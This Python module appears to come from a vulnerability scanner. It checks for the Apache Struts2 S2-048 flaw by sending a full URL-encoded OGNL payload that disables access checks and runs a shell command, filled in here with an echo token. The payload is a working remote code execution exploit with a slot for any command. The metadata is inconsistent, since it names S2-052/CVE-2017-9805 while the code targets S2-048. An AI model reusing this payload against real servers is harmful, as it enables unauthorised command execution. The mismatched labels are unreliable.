#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_048_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-052漏洞,又名CVE-2017-9805漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Apache Struts 2.1.x-2.3.x',
            'date': '2017-07-07',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': "application/x-www-form-urlencoded",
        }
        self.payload = '''%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())).(%23q)%7D'''
        self.data = 'name={data}&age=123&__checkbox_bustedBefore=true&description=123'

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            payload = self.payload.format(cmd = 'echo ' + self.capta)
            check_req = await request.post(self.url, headers = self.headers, data = self.data.format(data = payload))
            check_str = re.sub('\n', '', await check_req.text())
            result = re.findall('Gangster (.*?) added successfully', check_str)
            if self.capta in result:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_048 = S2_048_BaseVerify('http://127.0.0.1:8080/S2-048/integration/saveGangster.action')
  
   



